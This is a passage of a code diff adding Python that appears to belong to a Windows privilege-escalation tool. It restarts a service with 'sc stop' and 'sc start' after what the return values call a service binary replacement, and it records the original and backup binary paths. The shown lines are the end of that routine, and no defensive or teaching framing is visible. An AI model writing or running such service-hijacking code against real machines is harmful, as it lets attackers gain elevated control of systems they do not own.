+                                # Restart service
+                                subprocess.run(['sc', 'stop', service_name], capture_output=True)
+                                start_result = subprocess.run(['sc', 'start', service_name],
+                                                            capture_output=True, text=True)
+
+                                return {
+                                    'success': True,
+                                    'method': 'service_binary_replacement',
+                                    'binary_path': binary_path,
+                                    'backup_path': backup_path
+                                }
+
+            return {'success': False, 'error': 'No writable service binary found'}
+
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
